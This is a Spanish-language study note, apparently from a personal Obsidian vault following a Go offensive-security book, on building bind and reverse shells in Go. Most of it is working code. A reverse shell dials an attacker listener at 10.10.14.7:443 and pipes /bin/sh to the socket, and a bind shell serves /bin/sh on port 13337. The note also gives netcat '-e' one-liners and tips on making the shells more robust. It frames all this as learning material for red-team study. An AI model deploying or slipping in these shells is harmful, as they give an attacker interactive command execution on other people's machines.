---
tags:
  - Go
  - Go/Redes
  - Shells
Descripción: "El clímax del capítulo: en vez de reenviar tráfico a otro host, redirigir la entrada y salida de un programa sobre la conexión"
Fecha de actualización: 2026-07-24
Nota previa: "[[02 - Proxy TCP con io.Copy]]"
Nota siguiente: 
Area: "[[Redes TCP-IP.base|Redes TCP-IP]]"
---
---

El clímax del capítulo: en vez de reenviar tráfico a otro host, redirigir la entrada y salida de **un programa** sobre la conexión. Eso es la *gaping security hole* de Netcat (`nc -e /bin/bash`), que convierte una ejecución de comando en una shell interactiva. En Go sale de combinar `os/exec` con una `net.Conn` — que, como ya sabes, es a la vez `Reader` y `Writer`. La técnica de shells a fondo vive en Red Team ([[00 - Introducción a shells y payloads]]); aquí, cómo se construye en Go.

## `os/exec` y el tipo `Cmd`

El paquete `os/exec` ejecuta comandos del sistema. `exec.Command` crea un `Cmd` (aún no lo lanza), y sus campos `Stdin`, `Stdout` y `Stderr` son un `io.Reader` y dos `io.Writer` respectivamente. <mark style="background: #ADCCFFA6;">La jugada es asignar la conexión a esos tres campos</mark>: lo que el atacante teclee entra como stdin del proceso, y la salida del proceso sale por la conexión.

```go
cmd := exec.Command("/bin/sh", "-i")   // -i = modo interactivo
cmd.Stdin = conn
cmd.Stdout = conn
cmd.Stderr = conn                      // el libro OLVIDA stderr; sin él no ves errores
cmd.Run()                              // bloquea hasta que la shell termina
```

> [!warning]+ Redirige también `stderr`
> El libro solo conecta `Stdin` y `Stdout`. <mark style="background: #FF5582A6;">Sin `cmd.Stderr = conn`, los mensajes de error del comando no llegan al atacante</mark> — una shell a medias. Redirige los tres streams siempre.

## Bind shell: escuchar y servir una shell

La *bind shell* escucha en un puerto y entrega una shell a quien conecte. Es el `nc -lp 13337 -e /bin/sh` del libro, en Go:

```go
func handle(conn net.Conn) {
    defer conn.Close()
    cmd := exec.Command("/bin/sh", "-i")
    cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
    cmd.Run()
}
// main: net.Listen(":13337") + Accept + go handle(conn)  (esqueleto de la nota 00)
```

## El matiz de Windows y `io.Pipe`

En Linux lo anterior funciona tal cual. En **Windows** (`exec.Command("cmd.exe")`), el manejo de pipes anónimas hace que la salida no llegue al cliente hasta que se vacía el buffer. La solución elegante del libro es `io.Pipe()`, el pipe síncrono en memoria de Go que conecta un `Writer` con un `Reader`:

```go
rp, wp := io.Pipe()      // lo que se escribe en wp se lee por rp
cmd.Stdout = wp
go io.Copy(conn, rp)     // drena la salida del comando hacia la conexión
cmd.Run()
wp.Close()               // cierra el writer: io.Copy recibe EOF y su goroutine termina (sin leak)
```

Cualquier salida del comando va al `PipeWriter`, se lee por el `PipeReader` y sale por la conexión, sin tener que forzar `Flush` a mano.

## Reverse shell: la que usarás de verdad

La *bind shell* escucha, así que un firewall de **entrada** en el objetivo la bloquea. En un engagement real casi siempre quieres una **reverse shell**: el objetivo **se conecta de vuelta** a ti. Como la mayoría de redes permiten tráfico de salida (sobre todo a 443), <mark style="background: #8000E1A6;">la reverse shell salta los controles de entrada que matan a la bind shell</mark>. El libro la deja como ejercicio; es solo cambiar `Listen`/`Accept` por `Dial`:

```go
func main() {
    conn, err := net.Dial("tcp", "10.10.14.7:443")   // conecta al listener del atacante
    if err != nil {
        return
    }
    defer conn.Close()

    cmd := exec.Command("/bin/sh", "-i")
    cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
    cmd.Run()
}
```

Una mejora moderna sobre el libro: `exec.CommandContext` en vez de `exec.Command` ata el proceso a un `context`, así puedes **matar la shell** con un `cancel()` (timeout, señal de parada de tu C2):

```go
ctx, cancel := context.WithCancel(context.Background())
defer cancel()                                   // cancel() mata el proceso hijo
cmd := exec.CommandContext(ctx, "/bin/sh", "-i")
```

> [!warning]+ El `Run()` que se cuelga al salir de la shell
> Como `conn` no es un `*os.File`, `os/exec` lanza una goroutine interna que copia stdin desde el socket, y `Run()` **espera a que esa goroutine termine**. Cuando la shell hija muere (el operador teclea `exit`), esa goroutine sigue bloqueada leyendo del socket → `Run()` no retorna hasta que el cliente manda otro byte o cierra la conexión. La solución moderna es <mark style="background: #FFB86CA6;">`cmd.WaitDelay` (Go 1.20+)</mark>: `cmd.WaitDelay = time.Second` acota cuánto espera a esas goroutines de I/O tras salir el proceso.

## OPSEC y qué viene después

Esto es una shell **de manual**, para entender el mecanismo — no para soltarla en un engagement real. <mark style="background: #FFB86CA6;">`/bin/sh -i` deja un proceso obvio en el listado, el tráfico va en claro y cualquier IDS con una regla de reverse shell lo caza.</mark> Un implante serio cifra el canal, se camufla, sobrevive a caídas de conexión y no lanza un `sh` desnudo — todo eso es el bloque de [[Command and Control.base|Command and Control]] (Cap. 14) y la técnica de pentest vive en [[02 - Bind shells]] y [[03 - Reverse shells]] de Red Team.

---

Con esto cierras el Cap. 2: dominas TCP en Go —cliente, servidor, relay y ejecución remota— apoyado íntegramente en `net`, `io` y la concurrencia de los fundamentos. El siguiente bloque sube en la pila al protocolo más presente en cualquier red: construir clientes HTTP que hablen con Shodan, Metasploit y APIs de seguridad → [[Clientes HTTP.base|Clientes HTTP]] (Cap. 3).
